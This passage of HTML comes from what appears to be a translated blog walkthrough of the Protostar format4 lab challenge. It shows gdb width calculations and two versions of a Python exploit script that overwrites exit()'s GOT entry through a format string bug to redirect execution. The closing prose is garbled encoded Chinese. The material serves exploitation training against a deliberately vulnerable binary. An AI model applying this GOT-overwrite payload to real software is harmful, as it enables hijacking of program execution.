op"><strong class="ng iu">### Final Exploit</strong></span><span id="4eb1" class="mo kc it ng b gy or on l oo op">0x080484b4<!-- -->    <strong class="ng iu">&lt;-- Desired value &amp; divide this into 2</strong><br/>    â¬‡  <br/>  0x<!-- -->84b4<!-- -->      <strong class="ng iu">&lt;-- We will write this on "0x8049724"</strong><br/>  0x<!-- -->0804<!-- -->      <strong class="ng iu">&lt;-- We will write this on "0x8049726"</strong><br/>    </span><span id="93d9" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[Width Calculation #1: "0x8049724"]<br/>____________________________________________________________________    <br/></strong><em class="nm"># Written value was "0008." In order to calculate the width field, we need to subtract "0008" from our desired value = "</em>0x<!-- -->84b4<em class="nm">"</em></span><span id="ca38" class="mo kc it ng b gy or on l oo op">(gdb) print 0x84b4 - 0x0008<br/>  $5 = <strong class="ng iu">33964</strong></span><span id="3ffd" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[exploit.py - Width Calculation #1]</strong></span><span id="d020" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="160d" class="mo kc it ng b gy or on l oo op">import struct</span><span id="e5b8" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724<br/>exit_plt2 = 0x8049726</span><span id="087d" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= <strong class="ng iu">"%33964x%4$hn"</strong><br/>exploit+= "%5$08n"</span><span id="2a53" class="mo kc it ng b gy or on l oo op">print exploit</span><span id="0708" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[gdb - Width Calculation #1]</strong></span><span id="c147" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit</strong><br/><em class="nm">...(snip)...</em><br/><strong class="ng iu">(gdb) x 0x8049724</strong><br/>  0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: 0x84b4<strong class="ng iu">84b4   &lt;-- Written OK</strong></span><span id="92f6" class="mo kc it ng b gy or on l oo op"><strong class="ng iu"><br/>[Width Calculation #2: "0x8049726"]<br/>____________________________________________________________________</strong><em class="nm"># From the above calculation as you can see the second 2 byte location is also filled with "84b4" which means we need to subtract that value from our desired value to get the correct width field.</em></span><span id="b7a4" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) print 0x0804 - 0x84b4</strong><br/>  $6 = -31920</span><span id="94af" class="mo kc it ng b gy or on l oo op"><em class="nm"># Holdup... Negative output? Obviously, we cannot use this negative padding. In this case, however, there is a trick that we overflow into the next byte to get our desired value on the target location. Since we have a control on the stack, we can still overwrite the overflowed value. Example below:</em></span><span id="69d2" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) print 0x10804 - 0x84b4</strong><br/>  $7 = <strong class="ng iu">33616</strong></span><span id="f335" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[exploit.py - Width Calculation #2]</strong></span><span id="d179" class="mo kc it ng b gy or on l oo op">#!/usr/bin/python</span><span id="b722" class="mo kc it ng b gy or on l oo op">import struct</span><span id="7fad" class="mo kc it ng b gy or on l oo op">hello = 0x080484b4<br/>exit_plt = 0x8049724<br/>exit_plt2 = 0x8049726</span><span id="46a4" class="mo kc it ng b gy or on l oo op">exploit = ""<br/>exploit+= struct.pack("I",exit_plt)<br/>exploit+= struct.pack("I",exit_plt2)<br/>exploit+= "%33964x%4$hn"<br/>exploit+= <strong class="ng iu">"%33616x%5$hn"</strong></span><span id="6bbd" class="mo kc it ng b gy or on l oo op">print exploit</span><span id="e263" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">[gdb - Width Calculation #2]</strong></span><span id="fa08" class="mo kc it ng b gy or on l oo op"><strong class="ng iu">(gdb) run &lt; /home/user/format4/exploit</strong><br/><em class="nm">...(snip)...</em><br/><strong class="ng iu">(gdb) x 0x8049724<br/>  </strong>0x8049724 &lt;_GLOBAL_OFFSET_TABLE_+36&gt;: <strong class="ng iu">0x080484b4   &lt;-- Written OK</strong><br/><strong class="ng iu">(gdb) continue</strong><br/>  Continuing.<br/>  <strong class="ng iu">code execution redirected! you win   &lt;-- Winning Statement!</strong></span><span id="da78" class="mo kc it ng b gy or on l oo op">  Program exited with code 01.</span></pre><p id="672c" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">å®Œç¾ï¼æˆ‘ä»¬æˆåŠŸåœ°åˆ©ç”¨äº†æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æ¥è¦†ç›–<code class="fe nd ne nf ng b">exit()</code>çš„å…¥å£ç‚¹ï¼Œä»è€Œé‡å®šå‘æˆ‘ä»¬çš„æ‰§è¡Œæµæ¥æ‰“å°å‡ºè·èƒœçš„è¯­å¥ã€‚</p><p id="de0e" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">æˆ‘ä»¬è¿˜å¯ä»¥å°†æœ€ç»ˆçš„æ¼æ´è„šæœ¬ç›´æ¥è¿è¡Œåˆ°<code class="fe nd ne nf ng b">format4</code>äºŒè¿›åˆ¶æ–‡ä»¶ä¸­:</p><pre class="mk ml mm mn gt oi ng oj ok aw ol bi"><span id="ccbd" class="mo kc it ng b gy om on l oo op"><strong class="ng iu">$ python /home/user/format4/exploit.py | /opt/protostar/bin/format4</strong><br/>...(snip of A LOT OF white spaces)...<br/>                                         b7fd8420<br/><strong class="ng iu">code execution redirected! you win</strong></span></pre><p id="5e39" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk ns lm ln lo nt lq lr ls nu lu lv lw im bi translated">æ„Ÿè°¢é˜…è¯»ï¼</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi os"><img src="../Images/3735507d2c93e53a5b9d4423146e377a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MkNKI5Z0om2jypTQ.png"/></div></div></figure></div></div>    
</body>
</html>